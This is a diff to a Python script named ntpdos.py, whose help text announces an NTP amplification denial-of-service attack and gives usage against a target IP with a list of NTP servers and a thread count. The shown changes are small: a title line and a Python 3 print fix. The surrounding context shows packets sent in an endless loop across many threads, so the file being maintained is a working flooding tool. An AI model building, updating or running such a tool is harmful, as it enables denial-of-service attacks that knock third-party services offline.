@@ -22,6 +22,7 @@ send(packet,loop=1) #SEND IT
 
 #So I dont have to have the same stuff twice
 def printhelp():
+    print ("NTP Amplification DOS Attack")
     print ("By Kaff")
     print ("Usage ntpdos.py [ip] [ntpserver list] [number of threads]")
     print ("ex: ex: ntpdos.py 1.2.3.4 file.txt 10")
@@ -73,7 +74,7 @@ for n in range(numberthreads):
     threads.append(thread)
 
 #In progress!
-print "Sending..."
+print ("Sending...")
 
 #Keep alive so ctrl+c still kills all them threads
 while True:
